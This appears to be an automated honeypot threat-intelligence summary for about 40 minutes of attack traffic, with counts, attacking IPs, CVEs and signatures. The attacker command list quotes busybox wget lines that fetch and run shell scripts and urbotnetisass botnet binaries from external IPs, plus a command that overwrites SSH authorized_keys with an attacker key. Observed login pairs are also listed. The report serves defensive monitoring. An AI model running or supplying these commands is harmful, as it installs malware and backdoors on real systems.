Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-03T23:01:20Z
**Timeframe:** 2025-10-03T22:20:01Z to 2025-10-03T23:00:01Z
**Files Used:**
- agg_log_20251003T222001Z.json
- agg_log_20251003T224001Z.json
- agg_log_20251003T230001Z.json

**Executive Summary**

This report summarizes honeypot activity over a period of approximately 40 minutes, analyzing data from three separate log files. A total of 7,385 attacks were recorded across various honeypots. The most targeted services were Ciscoasa, Cowrie, and Mailoney. The majority of attacks originated from a diverse set of IP addresses, with significant activity from IPs located in various countries. Attackers were observed attempting to exploit older vulnerabilities, including CVEs from 2002, as well as more recent ones. Common tactics included brute-force login attempts, reconnaissance, and the attempted download and execution of malicious scripts.

**Detailed Analysis**

*   **Attacks by Honeypot:**
    *   Ciscoasa: 1882
    *   Cowrie: 1856
    *   Mailoney: 1663
    *   Suricata: 1234
    *   Sentrypeer: 237
    *   Honeytrap: 160
    *   Dionaea: 119
    *   Heralding: 47
    *   ConPot: 45
    *   Adbhoney: 38
    *   Tanner: 28
    *   H0neytr4p: 23
    *   Dicompot: 13
    *   Redishoneypot: 11
    *   Ipphoney: 10
    *   ElasticPot: 8
    *   Honeyaml: 8
    *   Miniprint: 3

*   **Top Attacking IPs:**
    *   86.54.42.238
    *   176.65.141.117
    *   185.156.73.166
    *   172.190.89.127
    *   196.251.84.181
    *   106.12.35.31
    *   64.188.92.102
    *   46.105.87.113
    *   155.4.244.169
    *   206.189.152.59

*   **Top Targeted Ports/Protocols:**
    *   25 (SMTP)
    *   22 (SSH)
    *   5060 (SIP)
    *   3306 (MySQL)
    *   80 (HTTP)
    *   443 (HTTPS)
    *   23 (Telnet)
    *   vnc/5900 (VNC)

*   **Most Common CVEs:**
    *   CVE-2002-0013, CVE-2002-0012
    *   CVE-2021-3449
    *   CVE-2019-11500
    *   CVE-2024-3721

*   **Commands Attempted by Attackers:**
    *   `cd ~; chattr -ia .ssh; lockr -ia .ssh`
    *   `lockr -ia .ssh`
    *   `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..." >> .ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~`
    *   `uname -a`
    *   `/ip cloud print`
    *   `cat /proc/cpuinfo`
    *   `rm -rf /data/local/tmp; mkdir -p /data/local/tmp; cd /data/local/tmp/; busybox wget http://213.209.143.62/w.sh; sh w.sh; ...`
    *   `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; ...`

*   **Signatures Triggered:**
    *   ET DROP Dshield Block Listed Source group 1
    *   ET SCAN NMAP -sS window 1024
    *   ET INFO Reserved Internal IP Traffic
    *   ET INFO VNC Authentication Failure
    *   ET DROP Spamhaus DROP Listed Traffic Inbound group 32
    *   ET CINS Active Threat Intelligence Poor Reputation IP group 49

*   **Users / Login Attempts:**
    *   a2billinguser/
    *   345gs5662d34/345gs5662d34
    *   root/helloadmin
    *   admin/123123
    *   debug/debug
    *   titu/Ahgf3487@rtjhskl854hd47893@#a4nC

*   **Files Uploaded/Downloaded:**
    *   wget.sh
    *   w.sh
    *   c.sh
    *   fonts.gstatic.com
    *   html5.js
    *   ie8.css
    *   arm.urbotnetisass
    *   arm5.urbotnetisass
    *   arm6.urbotnetisass
    *   arm7.urbotnetisass
    *   x86_32.urbotnetisass
    *   mips.urbotnetisass
    *   mipsel.urbotnetisass

*   **HTTP User-Agents:**
    *   *No significant user agents were logged during this period.*

*   **SSH Clients and Servers:**
    *   *No significant SSH clients or servers were logged during this period.*

*   **Top Attacker AS Organizations:**
    *   *No AS organization data was available in the logs.*

**Key Observations and Anomalies**

- A significant number of attacks were carried out by a small number of highly active IP addresses, suggesting targeted campaigns or the use of botnets.
- The commands executed by attackers indicate a focus on establishing persistent access via SSH authorized_keys, downloading and executing further malicious payloads, and gathering system information.
- The presence of attacks targeting both very old and very recent CVEs highlights the diverse range of tactics used by attackers, from exploiting legacy systems to targeting newer vulnerabilities.
- The high volume of SMTP traffic suggests that the honeypots are being targeted for spam relay or other email-related abuse.
- The attempted downloads of various architectures of `urbotnetisass` indicate a malware campaign targeting a wide range of IoT devices.
- There were multiple attempts to download and execute shell scripts from various IP addresses, which is a common tactic for malware propagation.
